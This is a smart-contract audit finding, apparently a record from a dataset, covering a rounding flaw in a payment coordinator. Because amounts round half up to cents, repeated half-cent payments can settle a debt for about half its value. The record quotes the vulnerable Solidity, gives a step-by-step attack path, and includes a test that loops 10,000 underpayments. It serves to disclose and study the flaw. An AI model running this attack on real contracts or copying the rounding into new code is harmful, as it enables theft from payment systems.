# [M] Users can pay off statements by just us-

## Summary
Severity: Medium
Contest weight: 0.7255
Dataset id: 2655
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The rounding half up in the function Coordinator::getAssetAmountCents() can allow users to pay off all owed value by just using 50% of that value
• The function Coordinator::getAssetAmountCents() converts the asset amount to cents, which rounds half up the result. By this, the amountCents could be deviated by maximum 0.5 cents from the actual amount.
```solidity
function getAssetAmountCents(
    address _asset,
    uint256 _amountNative
) public view returns (uint256 amountCents, uint8 assetDecimals) {
    // Check if asset is supported
    if (!isSupportedAsset(_asset)) {
        revert UnsupportedAsset(_asset);
    }
    SupportedAsset memory asset = supportedAssets[_asset];
    assetDecimals = _asset == address(0)
        ? 18 // All EVM chains should implement 18 decimals in its native asset
        : IERC20Decimals(_asset).decimals();
    if (asset.oracle == address(0)) {
        // asset is considered to be stable to USD
        uint256 divisor = 10 ** (assetDecimals - 2);
        // Add half of the divisor to round
        amountCents = (_amountNative + (divisor / 2)) / divisor;
    } else {
        (int256 price, uint8 priceDecimals) = _getCurrentAssetPrice(asset);
        uint256 divisor = 10 ** (uint256(priceDecimals) - 2 + assetDecimals);
        // Add half of the divisor to round
        amountCents = ((_amountNative * uint256(price)) + (divisor / 2)) / divisor;
    }
}
```
• The function Coordinator::makePaymentFromUserAccountForStatement() allows an arbitrary user to pay for a statement given that the asset is supported. The asset amount is converted to cents using the function getAssetAmountCents() above.
```solidity
function makePaymentFromUserAccountForStatement(
    address _asset,
    uint256 _amountNative,
    string calldata _statementId
) external payable {
    // Transfer asset from user account to treasury
    (
        uint256 amountCents,
        uint256 feeNative,
        uint8 assetDecimals
    ) = _makePaymentFromUserAccount(_asset, _amountNative);
    _markStatementPaid(statements[_statementId], amountCents);
    emit PaymentFromUserAccountForStatement(
        msg.sender,
        _asset,
        _amountNative,
        amountCents,
        feeNative,
        assetDecimals,
        _statementId
    );
}

function _makePaymentFromUserAccount(
    address _asset,
    uint256 _amountNative
)
    internal
    nonReentrant
    onlySupportedAsset(_asset)
    returns (uint256 amountCents, uint256 feeNative, uint8 assetDecimals)
{
    // Calculate fee with proper rounding
    feeNative = ((_amountNative * supportedAssets[_asset].feeBps) + 5000) / 10000;
    uint256 amountWithFeeNative = _amountNative + feeNative;
    // Convert amount to cents
    (amountCents, assetDecimals) = getAssetAmountCents(
        _asset,
        _amountNative
    );
    ...
}
```
So far, by paying 0.5 cents value of the asset, there will be 1 cent owed amount is deducted from the statement => the users can pay the full owed amount by paying 0.5 cents each time. Even though the gas needed to pay for the full owed amount is high but happens with the function makePaymentFromCollateralForStatement(), makePaymentFromCollateral(), makePaymentFromUserAccount()
Internal pre-conditions
External pre-conditions
Attack Path
1. A statement is created with 100 USD owed amount, equivalent 10000 cents
2. A user makes 10000 calls to function makePaymentFromUserAccountForStatement(), in each call the asset value equals to 0.5 cents. As a result, the user only pays 5000 cents
• 50% of statements values is loss

## Proof of Concept
Add this test to the file test/payments.ts
```solidity
it.only("pay half cent", async function () {
    const oneHourAfter = Math.floor(new Date().getTime() / 1000) + 60 * 60;
    await coordinator.connect(publisher).updateStatement(
        statementId,
        10000n, // 100 usd
        collateralProxyAddress,
        oneHourAfter,
    );
    let statement = await coordinator.statements(statementId);
    const user1BalanceBefore = await stableAsset1.balanceOf(user1Address);
    await stableAsset1
        .connect(user1)
        .approve(coordinatorAddress, user1BalanceBefore);
    for (let i = 0; i < 10000; ++i) {
        await coordinator.connect(user1).makePaymentFromUserAccountForStatement(
            stableAsset1Address,
            oneDollarStableAsset / 200n, // 0.5 cent
            statementId,
        );
    }
    statement = await coordinator.statements(statementId);
    expect(statement[3]).to.eq(10000n); // equal to 10000 cents
});
```
Run the test and it succeeds.

## Recommendation
No recommendation available
